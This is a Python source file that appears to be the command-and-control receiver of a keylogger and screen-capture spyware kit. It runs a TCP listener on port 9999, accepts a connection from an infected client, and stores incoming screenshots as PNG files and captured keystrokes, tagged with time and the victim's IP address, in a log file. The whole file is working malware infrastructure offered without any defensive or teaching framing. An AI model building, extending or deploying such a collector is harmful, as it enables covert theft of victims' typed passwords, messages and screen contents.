import socket
from datetime import datetime
import os

HOST = '0.0.0.0'
PORT = 9999

# Reliable receiver to read fixed-size chunks
def reliable_recv(conn, size):
    data = b''
    while len(data) < size:
        packet = conn.recv(size - len(data))
        if not packet:
            break
        data += packet
    return data

# Save screenshot data to disk
def save_screenshot(conn):
    size_data = reliable_recv(conn, 16).decode().strip()
    if not size_data.isdigit():
        print("[!] Invalid screenshot size")
        return
    size = int(size_data)
    img_data = reliable_recv(conn, size)

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs("screenshots", exist_ok=True)
    filepath = f"screenshots/screenshot_{timestamp}.png"
    with open(filepath, "wb") as f:
        f.write(img_data)
    print(f"[+] Screenshot saved: {filepath}")

# Save keylog snapshot to log file
def handle_keylog(conn, log_file):
    size_data = reliable_recv(conn, 16).decode().strip()
    if not size_data.isdigit():
        print("[!] Invalid keylog size")
        return
    size = int(size_data)
    buffer_data = reliable_recv(conn, size).decode(errors="ignore")

    timestamp = datetime.now().strftime("[%H:%M:%S]")
    print(f"[+] {timestamp} Keystrokes:\n{buffer_data}\n")

    log_file.write(f"{timestamp}\n{buffer_data}\n{'-'*50}\n")
    log_file.flush()

# Main server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print("[*] Listening for incoming connections...")

    conn, addr = s.accept()
    client_ip = addr[0]
    print(f"[*] Connection received from {client_ip}")

    os.makedirs("logs", exist_ok=True)
    with conn, open("logs/keylog.txt", "a") as log_file:
        session_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write("\n" + "="*50 + "\n")
        log_file.write(f"Session started: {session_time}\n")
        log_file.write(f"Client IP: {client_ip}\n")
        log_file.write("="*50 + "\n\n")

        while True:
            try:
                header = reliable_recv(conn, 10).decode().strip()
                if header == "SCREENSHOT":
                    save_screenshot(conn)
                elif header == "KEYLOG":
                    handle_keylog(conn, log_file)
                else:
                    print("[!] Unknown header:", header)
            except Exception as e:
                print("[!] Error:", e)
                break
